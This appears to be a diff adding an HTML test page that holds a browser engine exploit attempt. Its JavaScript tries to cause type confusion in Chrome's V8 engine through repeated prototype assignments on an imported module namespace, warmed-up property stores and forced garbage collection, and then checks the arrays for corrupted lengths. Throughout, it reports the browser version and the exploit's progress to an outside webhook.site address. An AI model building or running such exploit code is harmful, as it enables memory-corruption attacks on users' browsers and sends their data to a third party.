@@ -1,0 +1,38 @@
+<!doctype html><html><head><meta charset=utf-8><title>t4947</title></head><body>
+<script>
+var SINK='https://webhook.site/68430e4a-0cd0-43ad-a797-c7a0ddfe8af4';
+function b(v){v=String(v).slice(0,150);try{navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(v),'')}catch(e){}try{fetch(SINK+'?t='+encodeURIComponent(v),{mode:'no-cors'})}catch(e){}}
+b('boot '+(navigator.userAgent.match(/Chrome\/[0-9.]+/)||['?'])[0]);
+</script>
+<script type="module">
+var SINK='https://webhook.site/68430e4a-0cd0-43ad-a797-c7a0ddfe8af4';
+function b(v){v=String(v).slice(0,150);try{navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(v),'')}catch(e){}try{fetch(SINK+'?t='+encodeURIComponent(v),{mode:'no-cors'})}catch(e){}}
+b('mod-start');
+let ns;
+try { ns = await import('./m4947.mjs'); b('import:ok keys='+Object.keys(ns).join(',')); }
+catch(e){ b('import:ERR '+e.message); }
+if (ns) {
+  function to_fast(o){ var dummy={'unique':5}; dummy.__proto__=o; dummy.__proto__=o; }
+  function store(target,v){ target.c = v; }
+  function createObject(){ let a={}; a.i1=1;a.i2=1;a.i3=1;a.i4=1; for(let i=0;i<8;i++){ a['p'+i]=1; } return a; }
+  function init(){ let a=createObject(); a.__proto__=ns; return a; }
+  for(let i=0;i<2000;i++){ to_fast(ns); }
+  b('to_fast warmed');
+  for(let i=0;i<2000;i++){ store(init(), 0); }
+  b('store warmed');
+  let a = init();
+  let arr = []; arr.push(1.1);
+  let arr2 = [{}];
+  b('pre-trigger arr.len='+arr.length);
+  function confuse_properties_map(arg){ store(arg, 0x1); }
+  for(let i=0;i<2500;i++){ confuse_properties_map(init()); }
+  b('confused');
+  try { for(let i=0;i<400;i++){ new ArrayBuffer(0x10000); } b('gc-min ok'); } catch(e){ b('gc-min ERR'); }
+  try { new ArrayBuffer(0x3F000000); b('gc-maj ok'); } catch(e){ b('gc-maj ERR:'+e.name); }
+  b('post-gc arr.len='+arr.length+' arr2.len='+arr2.length);
+  try { a.p5=1024; a.p7=1024; b('writes ok len='+arr.length+' a2='+arr2.length); }
+  catch(e){ b('writes ERR '+e.name); }
+  b('final arr.len='+arr.length+' arr[0]='+arr[0]+' arr2.len='+arr2.length);
+  b('done');
+}
+</script></body></html>
